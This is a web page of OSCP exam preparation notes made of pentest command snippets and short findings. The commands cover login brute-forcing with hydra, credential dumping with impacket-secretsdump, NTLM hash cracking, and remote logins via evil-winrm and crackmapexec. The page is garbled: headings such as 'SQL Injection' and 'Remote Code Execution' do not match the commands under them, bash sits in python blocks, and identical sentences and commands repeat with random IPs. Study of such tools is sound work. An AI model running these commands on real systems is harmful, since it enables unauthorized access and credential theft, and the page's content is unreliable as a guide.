---
TitleSEO: "OSCP Exam Preparation Notes | ZureFX"
TitlePost: "OSCP Exam Preparation Notes"
Author: "ZureFX"
Description: "Personal notes on OSCP Exam Preparation Notes. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, privilege escalation, oscp, lateral movement, cheatsheet"
URL: "https://zurefx.github.io/notes/note-oscp-exam-preparation-notes-637.html"
URL_IMAGES: ""
Date: "2025-05-23"
Tags: "Enumeration, Privilege Escalation, OSCP, Lateral Movement, Cheatsheet"
Section: "notes"
Lang: "en"
main_img: "note-oscp-exam-preparation-notes-637"
Permalink: "/notes/note-oscp-exam-preparation-notes-637.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Python

### Remote Code Execution

```bash
feroxbuster -h
nmap -sCV -p445,139,3389 10.64.219.154 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.117.165 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.167.40/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

```python
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```powershell
crackmapexec smb 10.31.40.97 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.23.61.79 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## MSSQL

### atexec

```python
nmap -sCV -p80,8080,5986 10.128.242.91 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.205.41/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.162.172/FUZZ
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
crackmapexec smb 10.59.175.105 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## DLL Hijacking

### SQL Injection

```bash
evil-winrm -i 10.36.1.233 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.96.139.250 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.64.42.58 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

## GPP Password

### rubeus

- `Cron Job`
- `SSTI`
- `LAPS Abuse`
- `Resource-Based Constrained Delegation`

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

## Pass the Hash

### Elasticsearch

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
nmap -sCV -p587,23,1433 10.115.145.216 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.94.168.43 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.214.135/FUZZ
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.164.28
feroxbuster -h
evil-winrm -i 10.11.102.179 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.84.189.148/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.
